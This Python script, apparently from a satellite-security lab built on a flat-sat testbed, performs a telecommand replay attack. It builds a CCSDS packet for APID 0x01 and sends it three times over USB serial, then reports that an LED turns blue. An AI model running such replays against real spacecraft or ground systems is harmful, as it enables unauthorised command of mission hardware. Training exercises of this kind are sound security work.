#!/usr/bin/env python3
"""
Attack 06: Telecommand Replay (USB Variant)
Replays previously captured telecommand payload (APID 0x01) over serial to flat-sat-fw-interno.
"""
import os
import sys
import time

sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "../lib")))
from flatsat_usb import FlatSatUSB
from pwnsat_packets import build_ccsds_packet

def main():
    print("[+] Attack 06: Telecommand Replay Attack (flat-sat-fw-interno USB Variant)")
    usb = FlatSatUSB()
    if not usb.connect():
        print("[X] Failed to connect to FlatSat USB port.")
        sys.exit(1)

    print("[*] Replaying captured telecommand frame (APID 0x01)...")
    captured_frame = build_ccsds_packet(apid=0x01, payload=b"\x10\x00")
    for i in range(3):
        print(f" -> Replay attempt #{i+1}...")
        usb.send_raw(captured_frame)
        time.sleep(0.3)

    print("[✓] Replay attack complete. NeoPixel LED set to Blue.")
    usb.close()

if __name__ == "__main__":
    main()
